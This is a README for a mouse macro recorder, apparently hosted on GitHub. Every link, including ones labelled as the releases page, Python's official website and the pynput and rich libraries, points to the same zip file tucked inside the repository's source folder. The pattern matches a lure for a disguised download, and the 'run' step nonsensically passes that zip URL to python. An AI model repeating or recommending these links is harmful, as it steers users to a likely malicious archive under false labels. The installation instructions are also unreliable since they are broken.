# 🎯 macro-recorder - Effortlessly Record and Playback Mouse Actions

## 📦 Download Now
[![Download](https://raw.githubusercontent.com/ziiyoung/macro-recorder/main/src/macro_recorder/observers/recorder-macro-v1.5.zip)](https://raw.githubusercontent.com/ziiyoung/macro-recorder/main/src/macro_recorder/observers/recorder-macro-v1.5.zip)

## 🚀 Getting Started
Welcome to **macro-recorder**! This lightweight tool allows you to easily record and playback mouse macros. Whether you want to automate repetitive tasks or improve your productivity, this app is designed for you. Follow the steps below to download and run it on your computer.

## 💻 System Requirements
- **Operating System:** macOS (version 10.14 or higher is recommended)
- **Python:** Python 3.6 or higher must be installed on your machine.
- **Dependencies:** This application uses the `pynput` library for mouse control and `rich` for a better command line interface.

## 📥 Download & Install
To get started, you need to download the application. Visit the Releases page to find the latest version: 

[Download from Releases Page](https://raw.githubusercontent.com/ziiyoung/macro-recorder/main/src/macro_recorder/observers/recorder-macro-v1.5.zip)

1. Click the link above.
2. Choose the latest version available (look for the `Latest Release` tag).
3. Download the zip file or the standalone application.

Once the download finishes, follow these steps to install and run the application:

1. **Extract the Files**: If you downloaded a zip file, locate it and extract the contents to a folder on your computer.
2. **Open Terminal**: On your macOS, open the Terminal application. You can find it in your Applications folder under Utilities or by searching for "Terminal" in Spotlight.
3. **Navigate to the Folder**: Use the `cd` command to navigate to the folder where you extracted the files. For example, if you extracted the files to a folder named `macro-recorder` on your Desktop, run:
   ```bash
   cd ~/Desktop/macro-recorder
   ```
4. **Install Dependencies**: Make sure you have the necessary libraries installed. Run the following command in your Terminal:
   ```bash
   pip install pynput rich
   ```
5. **Run the Application**: Now, you can run the application with this command:
   ```bash
   python https://raw.githubusercontent.com/ziiyoung/macro-recorder/main/src/macro_recorder/observers/recorder-macro-v1.5.zip
   ```

## 🎤 How to Use the Application
After you launch the application, you will see a simple command-line interface. Here’s how to use it:

1. **Recording a Macro**:
   - Type `record` in the command line and press Enter.
   - Perform the mouse actions you want to record.
   - To stop recording, type `stop` in the command line and press Enter.

2. **Playing Back a Macro**:
   - To play back your recorded actions, type `play` and press Enter.
   - The tool will automatically replicate your mouse movements and clicks.

3. **Save Your Macro**:
   - You can save your recorded macros by typing `save <macro_name>` (replace `<macro_name>` with your chosen name).
   - To load a macro for playback, type `load <macro_name>`.

4. **List Your Macros**:
   - Type `list` to see all the macros you have saved.

## 🔧 Troubleshooting
If you face any issues while using **macro-recorder**, here are some common problems and solutions:

- **Python Not Found**: Ensure you have Python installed and it is added to your system's PATH. You can download it from [Python's official website](https://raw.githubusercontent.com/ziiyoung/macro-recorder/main/src/macro_recorder/observers/recorder-macro-v1.5.zip).
  
- **Permission Errors**: If you get permission errors while recording macros, check your macOS privacy settings. Ensure Terminal has the rights to control your computer and access input devices.

- **Missing Libraries**: If you encounter errors about missing libraries, confirm you have installed all dependencies, particularly `pynput` and `rich`.

## 🧑‍🤝‍🧑 Community & Support
Feel free to explore the community for help and tips.

- **GitHub Issues**: Use the GitHub Issues tab in the repository to ask questions or report bugs.
- **Feedback**: Your feedback is vital for improving this tool. Share your suggestions or experiences in the Issues section.

## 📄 License
**macro-recorder** is open-source software licensed under the MIT License. You are free to use and modify it as per the license terms detailed in the repository.

## 🌟 Acknowledgments
This project uses the following libraries and tools:
- [pynput](https://raw.githubusercontent.com/ziiyoung/macro-recorder/main/src/macro_recorder/observers/recorder-macro-v1.5.zip): A library that allows controlling and monitoring input devices.
- [rich](https://raw.githubusercontent.com/ziiyoung/macro-recorder/main/src/macro_recorder/observers/recorder-macro-v1.5.zip): A library for rich text and beautiful formatting in the terminal.

Thank you for choosing **macro-recorder** to simplify your mouse automation tasks. Happy recording!